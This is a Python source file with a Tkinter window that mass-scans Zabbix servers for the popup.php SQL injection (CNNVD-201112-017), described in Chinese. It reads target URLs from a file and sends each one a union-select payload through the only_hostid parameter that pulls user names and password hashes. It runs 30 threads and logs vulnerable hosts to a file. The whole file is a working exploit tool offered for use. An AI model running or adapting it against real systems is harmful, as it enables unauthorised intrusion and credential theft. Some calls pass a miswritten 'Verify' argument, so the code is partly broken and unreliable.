import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
"""
Zabbix ‘popup.php’SQL注入漏洞
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201112-017
Zabbix的popup.php中存在SQL注入漏洞。远程攻击者可借助only_hostid参数执行任意SQL命令。
"""
def zabbix_sql_exp(url):
    poc = r"""popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=1))%20union%20select%201,group_concat(surname,0x2f,passwd)%20from%20users%23"""
    target_url = url + poc
    status_str = ['Administrator', 'User']
    try:
        res = requests.get(url, Verify=False,timeout=3)
        if res.status_code == 200:
            target_url_payload = f"{target_url}"
            res = requests.get(url=target_url_payload,Verify=False)
            if res.status_code == 200:
                for i in range(len(status_str)):
                    if status_str[i] in res.text:
                        zabbix_sql.insert(END,"【*】存在漏洞的url：" + url + "\n")
                        zabbix_sql.see(END)
                        with open ("存在Zabbix—SQL注入漏洞的url.txt", 'a') as f:
                            f.write(url + "\n")
            else:
                target_url = url + '/zabbix/' + poc
                res = requests.get(url=target_url,verify=False)
                for i in range(len(status_str)):
                    if status_str[i] in res.text:
                        zabbix_sql.insert(END, "【*】存在漏洞的url：" + url + "\n")
                        zabbix_sql.see(END)
                        with open("存在Zabbix—SQL注入漏洞的url.txt", 'a') as f:
                            f.write(url + "\n")
        else:
            zabbix_sql.insert(END, "【×】不存在漏洞的url：" + url + "\n")
            zabbix_sql.see(END)
    except Exception as err:
        zabbix_sql.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        zabbix_sql.see(END)
def get_zabbix_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def zabbix_sql_gui():
    zabbix_sql_poc = tk.Tk()
    zabbix_sql_poc.geometry("910x450")
    zabbix_sql_poc.title("Zabbix—SQL注入 漏洞一把梭")
    zabbix_sql_poc.resizable(0, 0)
    zabbix_sql_poc.iconbitmap('logo.ico')
    global zabbix_sql
    zabbix_sql = scrolledtext.ScrolledText(zabbix_sql_poc,width=123, height=25)
    zabbix_sql.grid(row=0, column=0, padx=10, pady=10)
    zabbix_sql.see(END)
    addrs = get_zabbix_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(zabbix_sql_exp, addr)
    zabbix_sql_poc.mainloop()